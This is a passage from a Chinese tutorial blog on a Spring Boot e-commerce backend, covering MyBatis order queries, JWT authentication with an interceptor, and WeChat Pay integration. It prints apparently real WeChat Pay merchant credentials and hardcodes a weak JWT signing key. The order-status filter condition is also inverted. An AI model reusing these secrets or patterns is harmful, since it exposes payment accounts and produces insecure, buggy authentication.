    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImg&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_price&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productPrice&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;buy_counts&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;buyCounts&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;total_amount&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;DECIMAL&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;totalAmount&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;basket_date&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;basketDate&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;buy_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;buyTime&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_comment&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isComment&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;listOrderItemsByOrderId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select
      item_id,
      order_id,
      product_id,
      product_name,
      product_img,
      sku_id,
      sku_name,
      product_price,
      buy_counts,
      total_amount,
      basket_date,
      buy_time,
      is_comment
    from order_item where order_id=#&#123;orderId&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listOrders</span><span class="hljs-params">(String userId, String status, <span class="hljs-type">int</span> pageNum, <span class="hljs-type">int</span> limit)</span> &#123;
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(Orders.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
    criteria.andLike(<span class="hljs-string">&quot;userId&quot;</span>, userId);
    <span class="hljs-keyword">if</span>(status != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-string">&quot;&quot;</span>.equals(status))&#123;
        criteria.andEqualTo(<span class="hljs-string">&quot;status&quot;</span>,status);
    &#125;
    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> ordersMapper.selectCountByExample(example);

    <span class="hljs-comment">//2.计算总页数（必须确定每页显示多少条  pageSize = limit）</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">pageCount</span> <span class="hljs-operator">=</span> count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;


    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;OrdersVO&gt; ordersVOS = ordersMapper.selectOrders(userId, status, start, limit);
    PageHelper&lt;OrdersVO&gt; ordersVOPageHelper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageHelper</span>&lt;&gt;(count, pageCount, ordersVOS);

    <span class="hljs-keyword">return</span> ResultVO.success(ordersVOPageHelper);
&#125;</code></pre>


</li>
<li><p>controller</p>
<pre><code class="hljs java">
<span class="hljs-meta">@GetMapping(&quot;/list&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getList</span><span class="hljs-params">(String userId,</span>
<span class="hljs-params">                        String status,</span>
<span class="hljs-params">                        <span class="hljs-type">int</span> pageNum,</span>
<span class="hljs-params">                        <span class="hljs-type">int</span> limit)</span>&#123;
    <span class="hljs-keyword">return</span> orderService.listOrders(userId, status, pageNum,limit);

&#125;</code></pre></li>
</ul>
<h4 id="收货地址管理"><a href="#收货地址管理" class="headerlink" title="收货地址管理"></a>收货地址管理</h4><h2 id="2-JWT实现权限认证"><a href="#2-JWT实现权限认证" class="headerlink" title="2  JWT实现权限认证"></a>2  JWT实现权限认证</h2><h3 id="2-1-JWT实现"><a href="#2-1-JWT实现" class="headerlink" title="2.1 JWT实现"></a>2.1 JWT实现</h3><h4 id="导入JWT依赖"><a href="#导入JWT依赖" class="headerlink" title="导入JWT依赖"></a>导入JWT依赖</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.10.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h4 id="生成对应的token并返回给前端"><a href="#生成对应的token并返回给前端" class="headerlink" title="生成对应的token并返回给前端"></a>生成对应的token并返回给前端</h4><pre><code class="hljs java"><span class="hljs-comment">// 验证成功则生成对应的token</span>
<span class="hljs-comment">// 使用jwt生成token</span>
<span class="hljs-type">JwtBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> Jwts.builder();
Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
map.put(<span class="hljs-string">&quot;key1&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
map.put(<span class="hljs-string">&quot;key2&quot;</span>, <span class="hljs-string">&quot;value2&quot;</span>);
<span class="hljs-type">JwtBuilder</span> <span class="hljs-variable">jwtBuilder</span> <span class="hljs-operator">=</span> builder.setSubject(username)    <span class="hljs-comment">//设置subject</span>
    .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>())        <span class="hljs-comment">// 设置token生成的时间</span>
    .setId(user.getUserId() + <span class="hljs-string">&quot;&quot;</span>)        <span class="hljs-comment">// 设置userid为token的唯一id</span>
    .setClaims(map)                 <span class="hljs-comment">// map中可以存放用户的角色和权限信息</span>
    .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span> * <span class="hljs-number">2</span>))               <span class="hljs-comment">// 设置token的过期时间 为两天</span>
    .signWith(SignatureAlgorithm.HS256, <span class="hljs-string">&quot;sunzy123456&quot;</span>);<span class="hljs-comment">// 设置token的加密方式和加密密钥</span>

<span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> jwtBuilder.compact();   <span class="hljs-comment">// 获取token</span>
<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, token, user);</code></pre>

<h4 id="前端进行登录验证时获取对应的token"><a href="#前端进行登录验证时获取对应的token" class="headerlink" title="前端进行登录验证时获取对应的token"></a>前端进行登录验证时获取对应的token</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220711172838166.png" alt="image-20220711172838166"></p>
<h4 id="JWT进行token解析"><a href="#JWT进行token解析" class="headerlink" title="JWT进行token解析"></a>JWT进行token解析</h4><pre><code class="hljs java"><span class="hljs-keyword">if</span>(token == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-literal">null</span>);
&#125;<span class="hljs-keyword">else</span> &#123;
    <span class="hljs-type">JwtParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> Jwts.parser();
    parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
    <span class="hljs-keyword">try</span>&#123;
        <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
        Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
        <span class="hljs-type">Claims</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">key1</span> <span class="hljs-operator">=</span> body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
    &#125;<span class="hljs-keyword">catch</span>(UnsupportedJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;token不合法请重新登录！&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;<span class="hljs-keyword">catch</span>(ExpiredJwtException e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;
    <span class="hljs-keyword">catch</span> (Exception e)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;未知错误&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;</code></pre>

<h4 id="使用拦截器验证token"><a href="#使用拦截器验证token" class="headerlink" title="使用拦截器验证token"></a>使用拦截器验证token</h4><ul>
<li><p>创建拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.interceptor;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.jsonwebtoken.*;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;

<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.PrintWriter;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CheckTokenInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;token&quot;</span>);

        <span class="hljs-keyword">if</span> (token == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(token)) &#123;
            doResponse(response, <span class="hljs-string">&quot;请先登录！&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-type">JwtParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> Jwts.parser();
            parser.setSigningKey(<span class="hljs-string">&quot;sunzy123456&quot;</span>); <span class="hljs-comment">// 密钥需要与加密时使用的一致</span>
            <span class="hljs-keyword">try</span> &#123;
                <span class="hljs-comment">// 如果token正确 且在有效期内 则解析正常否则会出现异常</span>
                Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token);
                <span class="hljs-type">Claims</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> claimsJws.getBody();  <span class="hljs-comment">// 获取token中的用户数据</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">subject</span> <span class="hljs-operator">=</span> body.getSubject();  <span class="hljs-comment">// 获取token中发subject</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">key1</span> <span class="hljs-operator">=</span> body.get(<span class="hljs-string">&quot;key1&quot;</span>, String.class);  <span class="hljs-comment">/// 获取添加在map中的值</span>
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">catch</span> (UnsupportedJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token不合法，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (ExpiredJwtException e) &#123;
                doResponse(response,<span class="hljs-string">&quot;token已过期，请重新登录！&quot;</span>);
            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
                doResponse(response,<span class="hljs-string">&quot;未知错误！&quot;</span>);
            &#125;

            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        &#125;
    &#125;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">doResponse</span><span class="hljs-params">(HttpServletResponse response, String msg)</span> <span class="hljs-keyword">throws</span> IOException &#123;
        <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, msg, <span class="hljs-literal">null</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> JSON.toJSONString(resultVO);
        response.setContentType(<span class="hljs-string">&quot;application/json&quot;</span>);
        response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);
        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();
        writer.write(string);
        writer.flush();
        writer.close();
    &#125;

&#125;
</code></pre>


</li>
<li><p>配置拦截器</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.config;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.interceptor.CheckTokenInterceptor;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 拦截器的配置类</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CheckTokenInterceptor checkTokenInterceptor;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addInterceptors</span><span class="hljs-params">(InterceptorRegistry registry)</span> &#123;
        <span class="hljs-comment">// registry是拦截器的注册器</span>
        <span class="hljs-comment">// 将自己创建的拦截器加入进来 即可实现拦截功能</span>
        registry.addInterceptor(checkTokenInterceptor)
        .addPathPatterns(<span class="hljs-string">&quot;/**&quot;</span>)  <span class="hljs-comment">// 拦截所有路径</span>
        .excludePathPatterns(<span class="hljs-string">&quot;/user/**&quot;</span>); <span class="hljs-comment">// 除了用户登录和注册路径</span>
    &#125;
&#125;
</code></pre></li>
</ul>
<h3 id="2-2-通过header传递token"><a href="#2-2-通过header传递token" class="headerlink" title="2.2 通过header传递token"></a>2.2 通过header传递token</h3><blockquote>
<p>前端访问受限资源时，都必须携带token发送请求，token可以放在请求行(params)、请求头(header)以及请求体(data)，但是一般默认放在请求头中</p>
</blockquote>
<ul>
<li><p>前端使用axios</p>
<pre><code class="hljs js"><span class="hljs-title function_">axios</span>(&#123;
    <span class="hljs-attr">url</span>:url,
    <span class="hljs-attr">method</span>:<span class="hljs-string">&quot;get&quot;</span>,
    <span class="hljs-attr">headers</span>:&#123;
        <span class="hljs-attr">token</span>:token
    &#125;,
    <span class="hljs-attr">params</span>:&#123;
        <span class="hljs-attr">userId</span>:userId
    &#125;
&#125;)</code></pre>


</li>
<li><p>浏览器的预检机制</p>
<p>只要是带自定义header的跨域请求，在发送真实请求前都会先发送OPTIONS请求，浏览器根据OPTIONS请求返回的结果来决定是否继续发送真实的请求进行跨域资源访问。所以复杂请求肯定会两次请求服务端。</p>
<p>因此需要在拦截器中加入以下代码，必要响应第一次的OPTIONS请求后，才能收到第二次的GET请求。</p>
<pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();
System.out.println(method);
<span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;OPTIONS&quot;</span>.equals(method))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
&#125;</code></pre>
</li>
<li></li>
</ul>
<h2 id="3-通用实体类"><a href="#3-通用实体类" class="headerlink" title="3.通用实体类"></a>3.通用实体类</h2><p>3.1 用于响应的实体类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.qfedu.fmmall.vo;

<span class="hljs-keyword">import</span> io.swagger.annotations.ApiModel;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiModelProperty;
<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.NoArgsConstructor;

<span class="hljs-keyword">import</span> javax.annotation.Resource;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@ApiModel(value = &quot;ResultVO对象&quot;,description = &quot;封装接口返回给前端的数据&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResultVO</span> &#123;

    <span class="hljs-comment">//响应给前端的状态码</span>
    <span class="hljs-meta">@ApiModelProperty(value = &quot;响应状态码&quot;,dataType = &quot;int&quot;)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> code;

    <span class="hljs-comment">//响应给前端的提示信息</span>
    <span class="hljs-meta">@ApiModelProperty(&quot;响应提示信息&quot;)</span>
    <span class="hljs-keyword">private</span> String msg;

    <span class="hljs-comment">//响应给前端的数据</span>
    <span class="hljs-meta">@ApiModelProperty(&quot;响应数据&quot;)</span>
    <span class="hljs-keyword">private</span> Object data;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title function_">success</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title function_">success</span><span class="hljs-params">(String msg)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, msg, <span class="hljs-literal">null</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title function_">success</span><span class="hljs-params">(Object obj)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>, obj);
    &#125;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title function_">failed</span><span class="hljs-params">()</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-literal">null</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResultVO <span class="hljs-title function_">failed</span><span class="hljs-params">(String msg)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO, msg, <span class="hljs-literal">null</span>);
    &#125;

&#125;
</code></pre>





<h2 id="4-微信支付"><a href="#4-微信支付" class="headerlink" title="4 微信支付"></a>4 微信支付</h2><blockquote>
<p>通过微信平台为商家提供代收款服务</p>
</blockquote>
<h3 id="4-1-商户注册微信支付业务"><a href="#4-1-商户注册微信支付业务" class="headerlink" title="4.1 商户注册微信支付业务"></a>4.1 商户注册微信支付业务</h3><ul>
<li>商户编号：1497984412</li>
<li>商户账号AppID：wx632c8f211f8122c6</li>
<li>商户Key：sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC</li>
</ul>
<h3 id="4-2-商户向微信申请支付订单，即支付短链接"><a href="#4-2-商户向微信申请支付订单，即支付短链接" class="headerlink" title="4.2 商户向微信申请支付订单，即支付短链接"></a>4.2 商户向微信申请支付订单，即支付短链接</h3><ul>
<li><p>导入微信支付的依赖</p>
<pre><code class="hljs XML"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.wxpay<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wxpay-sdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
 <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
</li>
<li><p>创建WXPayConfig，重写里面的方法，设置自己的AppID，商户id，密钥，</p>
<pre><code class="hljs java">
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPayConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WXPayConfig</span> &#123;
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getAppID</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wx632c8f211f8122c6&quot;</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMchID</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1497984412&quot;</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getKey</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;sbNCm1JnevqI36LrEaxFwcaT0hkGxFnC&quot;</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> InputStream <span class="hljs-title function_">getCertStream</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHttpConnectTimeoutMs</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHttpReadTimeoutMs</span><span class="hljs-params">()</span> &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    &#125;
&#125;
</code></pre>
</li>
<li><p>设置⽀付订单的参数</p>
<pre><code class="hljs java">HashMap&lt;String,String&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
data.put(<span class="hljs-string">&quot;body&quot;</span>,<span class="hljs-string">&quot;咪咪萧条&quot;</span>); <span class="hljs-comment">//商品描述</span>
data.put(<span class="hljs-string">&quot;out_trade_no&quot;</span>,orderId); <span class="hljs-comment">//使⽤当前⽤户订单的编号作为当前⽀付交易的</span>
交易号
data.put(<span class="hljs-string">&quot;fee_type&quot;</span>,<span class="hljs-string">&quot;CNY&quot;</span>); <span class="hljs-comment">//⽀付币种</span>
data.put(<span class="hljs-string">&quot;total_fee&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//⽀付⾦额</span>
data.put(<span class="hljs-string">&quot;trade_type&quot;</span>,<span class="hljs-string">&quot;NATIVE&quot;</span>); <span class="hljs-comment">//交易类型</span>
data.put(<span class="hljs-string">&quot;notify_url&quot;</span>,<span class="hljs-string">&quot;/pay/success&quot;</span>); <span class="hljs-comment">//设置⽀付完成时的回调⽅法</span>
接⼝</code></pre>
</li>
<li><p>申请支付连接</p>
<pre><code class="hljs java"><span class="hljs-type">WXPay</span> <span class="hljs-variable">wxPay</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WXPay</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MyPayConfig</span>());
Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data); <span class="hljs-comment">//发送请求</span>
